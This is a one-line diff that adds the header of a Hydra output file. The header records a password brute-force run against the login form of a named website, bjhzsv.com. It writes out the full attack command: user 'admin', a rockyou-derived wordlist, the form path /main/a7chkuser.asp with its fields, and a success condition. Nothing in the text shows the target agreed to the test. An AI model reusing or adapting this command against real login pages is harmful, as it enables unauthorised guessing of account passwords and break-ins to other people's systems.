@@ -1,0 +1,1 @@
+# Hydra v9.2 run at 2026-07-30 00:59:27 on bjhzsv.com http-post-form (hydra -l admin -P /tmp/rockyou_6_12.txt -t 1 -w 2 -o /tmp/hydra_bj2.txt bjhzsv.com http-post-form /main/a7chkuser.asp:t1=^USER^&t2=^PASS^&t3=1234:S=main.asp)
